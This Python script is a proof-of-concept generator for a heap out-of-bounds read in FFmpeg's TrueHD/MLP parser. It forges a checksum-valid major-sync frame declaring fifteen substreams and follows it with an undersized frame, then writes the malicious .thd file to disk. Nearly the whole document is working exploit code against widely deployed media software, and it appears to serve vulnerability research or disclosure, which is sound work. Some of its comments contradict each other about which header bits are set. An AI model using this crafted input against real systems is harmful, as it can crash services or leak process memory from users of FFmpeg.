#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Heap OOB Read in mlp_parse() Parity Check Loop via Unbounded Buffer Access
File: libavcodec/mlp_parser.c, lines 146-154
CWE-125: Out-of-bounds Read

Strategy:
  1. Craft a valid TrueHD sync frame with num_substreams=15 (max 4-bit value).
     The parser reads this, sets mp->num_substreams = 15.
  2. Immediately follow with a 8-byte non-sync frame (minimal length).
     The parser's parity check loop at lines 146-154 iterates num_substreams+1=16
     times, attempting to read up to 64 bytes from an 8-byte buffer.
"""

import struct
import sys

# ---------------------------------------------------------------------------
# CRC-16 with polynomial 0x002D, replicating FFmpeg's av_crc exactly.
#
# av_crc_init(crc_2D, le=0, bits=16, poly=0x002D, ctx_size) computes:
#   for each i: c = MSB-first shift of (i<<24) with poly<<16; ctx[i] = bswap32(c)
#   ctx[256] = 1  (non-reflected / MSB-first indicator)
#
# av_crc() always uses the LE-style loop regardless of ctx[256]:
#   crc = ctx[(uint8_t(crc)) ^ byte] ^ (crc >> 8)
#
# The combination of byte-swapped table + LE loop gives the correct
# non-reflected 16-bit CRC in the LOWER 16 bits of the 32-bit state.
# ---------------------------------------------------------------------------

def _make_crc16_table_ffmpeg():
    """Replicates av_crc_init(ctx, le=0, bits=16, poly=0x002D, 257*4)"""
    table = []
    for i in range(256):
        c = i << 24
        for _ in range(8):
            if c & 0x80000000:
                c = ((c << 1) ^ (0x002D << 16)) & 0xFFFFFFFF
            else:
                c = (c << 1) & 0xFFFFFFFF
        # av_bswap32(c)
        bswap = ((c & 0xFF) << 24) | (((c >> 8) & 0xFF) << 16) | \
                (((c >> 16) & 0xFF) << 8) | ((c >> 24) & 0xFF)
        table.append(bswap)
    table.append(1)  # ctx[256] = 1
    return table

_CRC16_TABLE = _make_crc16_table_ffmpeg()

def _av_crc_002d(data, init=0):
    """Replicates av_crc(crc_2D, init, data, len(data))"""
    crc = init & 0xFFFFFFFF
    for byte in data:
        idx = (crc ^ byte) & 0xFF
        crc = _CRC16_TABLE[idx] ^ (crc >> 8)
    return crc & 0xFFFFFFFF

def ff_mlp_checksum16(buf):
    """
    Replicate ff_mlp_checksum16(buf, len(buf)) from mlp.c:
        uint16_t crc;
        crc = av_crc(crc_2D, 0, buf, buf_size - 2);   // 32->16 bit truncation
        crc ^= AV_RL16(buf + buf_size - 2);
        return crc;
    Called with buf_size = header_size - 2 = 26.
    """
    n = len(buf)
    crc32 = _av_crc_002d(buf[:n - 2])
    crc16 = crc32 & 0xFFFF               # uint16_t truncation
    le16 = buf[n - 2] | (buf[n - 1] << 8)  # AV_RL16 of last 2 bytes
    return (crc16 ^ le16) & 0xFFFF

# ---------------------------------------------------------------------------
# Build the 28-byte major sync header (gb->buffer in the parser, = frame+4)
# ---------------------------------------------------------------------------
# Bit layout (MSB-first per byte):
#
#  Byte  0-2  : sync words 0xf8726f          (24 bits)
#  Byte  3    : stream_type = 0xba (TrueHD)  (8 bits)
#  Byte  4    : ratebits=0 (48 kHz) | skip4  (8 bits)
#  Byte  5    : modifier0=0 | modifier1=0 | channel_arrangement[4:1]=0000
#  Byte  6    : channel_arrangement[0]=1 | modifier2=0 | arrangement2[12:8]=00000
#  Byte  7    : arrangement2[7:0] = 0x01  (channel_arrangement2=1 = stereo)
#  Bytes 8-13 : skip 48 bits (zeros)
#  Byte 14    : is_vbr=1 | peak_bitrate[14:8]=0
#  Byte 15    : peak_bitrate[7:0]=0
#  Byte 16    : num_substreams=0xF (15) | skip2 | extended_substream_info=0
#  Byte 17    : substream_info=0x03
#  Bytes 18-25: skip 10 bytes (zeros)
#  Bytes 26-27: CRC-16 checksum (little-endian)
#
# The parser's ff_mlp_read_major_sync() then stores mh.num_substreams=15
# into mp->num_substreams.
# ---------------------------------------------------------------------------

def build_major_sync():
    gb = bytearray(28)

    # Sync word + stream type
    gb[0] = 0xF8
    gb[1] = 0x72
    gb[2] = 0x6F
    gb[3] = 0xBA   # TrueHD

    # ratebits=0 (48000 Hz), skip nibble=0
    gb[4] = 0x00

    # modifier0=0, modifier1=0, channel_arrangement[4:1]=0
    gb[5] = 0x00

    # channel_arrangement[0]=1 (stereo bit), modifier2=0, arrangement2[12:8]=0
    gb[6] = 0x80

    # arrangement2[7:0] = 1  => arrangement2 = 1 => truehd_channels(1) = 2 (stereo)
    gb[7] = 0x01

    # bytes 8-13: skipped (48 bits) - already zero

    # is_vbr=1 (bit7), peak_bitrate=0
    gb[14] = 0x80
    gb[15] = 0x00

    # num_substreams = 15 (0xF) in top 4 bits, skip=0, extended_substream_info=0
    gb[16] = 0xF0

    # substream_info (not validated by parser)
    gb[17] = 0x03

    # bytes 18-25: skipped - already zero

    # Compute and embed checksum.
    # ff_mlp_checksum16 is called as ff_mlp_checksum16(gb->buffer, header_size-2)
    # = ff_mlp_checksum16(gb, 26)
    # = crc16(gb[0:24]) ^ LE16(gb[24:26])   [bytes 24-25 are zero]
    # Result must equal AV_RL16(gb[26:28])
    checksum = ff_mlp_checksum16(bytes(gb[:26]))
    gb[26] = checksum & 0xFF
    gb[27] = (checksum >> 8) & 0xFF

    return gb

# ---------------------------------------------------------------------------
# Build frame 1: sync frame (4-byte header + 28-byte major sync = 32 bytes)
# Frame length field: lower 12 bits of AV_RB16(buf[0:2]) * 2 = 32
#   => (buf[0]<<8 | buf[1]) & 0xFFF = 16 => buf[0]=0x00, buf[1]=0x10
# ---------------------------------------------------------------------------

def build_sync_frame(major_sync):
    frame = bytearray(32)
    frame[0] = 0x00
    frame[1] = 0x10   # (0x010 & 0xFFF) * 2 = 32
    frame[2] = 0x00   # timing / padding
    frame[3] = 0x00
    frame[4:32] = major_sync
    return frame

# ---------------------------------------------------------------------------
# Build frame 2: non-sync frame (8 bytes)
# Frame length: (0x004 & 0xFFF) * 2 = 8
# Bytes 4-7 must NOT match the TrueHD/MLP sync word (0xf8726fba/0xf8726fbb)
# so that sync_present = 0 and the parity check loop is entered.
#
# With mp->num_substreams = 15 the loop does:
#   i=-1 : reads buf[0..3] (4 bytes, always)     p=4
#   i=0  : reads buf[4..5] (buf[4]&0x80 = 0)     p=6
#   i=1  : reads buf[6..7] (buf[6]&0x80 = 0)     p=8
#   i=2  : reads buf[8]  --> OOB (buf only 8 bytes)
# ---------------------------------------------------------------------------

def build_nonsync_frame():
    # 8-byte frame, no sync word at offset 4.
    # Set bit7=1 in substream header bytes (positions 4 and 6) so the parity
    # loop takes the "4 bytes per substream" path, maximising OOB reads.
    # i=-1: reads buf[0..3] (4 bytes)        p=4
    # i=0 : reads buf[4..5] + 4-byte path   -> reads buf[4..7] p=8 (buf[4]&0x80=1)
    # i=1 : reads buf[8..9] -> OOB!
    frame = bytearray(8)
    frame[0] = 0x00
    frame[1] = 0x04   # (0x004 & 0xFFF) * 2 = 8
    frame[2] = 0x00
    frame[3] = 0x00
    frame[4] = 0x80   # bit7=1 forces 4-byte read for substream 0, first OOB at buf[8]
    frame[5] = 0x00
    frame[6] = 0x00
    frame[7] = 0x00
    return frame

# ---------------------------------------------------------------------------
# A small garbage prefix ensures the parser's !in_sync branch consumes > 0
# bytes on the first call (i-7 > 0), unblocking the parsing loop.
# Without this, the !in_sync branch with sync-at-byte-0 returns 0 consumed,
# which can cause the caller to treat it as no-progress and discard the packet.
# ---------------------------------------------------------------------------
GARBAGE_PREFIX = bytes(8)   # 8 zero bytes guaranteed not to match the sync word

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    outfile = 'vuln_001_input.thd'

    major_sync = build_major_sync()
    frame1 = build_sync_frame(major_sync)
    frame2 = build_nonsync_frame()

    # Prefix 8 garbage bytes so the sync is found at i=15 (i-7=8>0),
    # giving the parser a non-zero consume count on the first !in_sync call.
    data = GARBAGE_PREFIX + bytes(frame1) + bytes(frame2)

    with open(outfile, 'wb') as f:
        f.write(data)

    checksum_val = (major_sync[27] << 8) | major_sync[26]
    print(f"[+] Written {len(data)} bytes to {outfile}")
    print(f"[+] Garbage prefix: {len(GARBAGE_PREFIX)} bytes")
    print(f"[+] Sync frame    : {len(frame1)} bytes  (num_substreams=15 embedded)")
    print(f"[+] Non-sync frame: {len(frame2)} bytes  (8 bytes, triggers OOB in parity loop)")
    print(f"[+] Major sync checksum: 0x{checksum_val:04X}")
    print(f"[+] Expected OOB: parity loop reads buf[0..8+] but buf_size=8")

if __name__ == '__main__':
    main()
